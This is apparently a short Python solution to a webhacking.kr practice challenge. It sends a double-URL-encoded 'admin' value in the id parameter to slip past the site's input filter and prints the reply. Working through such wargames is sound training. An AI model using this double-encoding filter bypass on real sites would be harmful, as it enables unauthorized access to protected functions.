import requests

url = "https://webhacking.kr/challenge/web-11/?id="
encoded_admin = "%2561%2564%256d%2569%256e"

response = requests.get(url +encoded_admin)                                

print(response.text)

    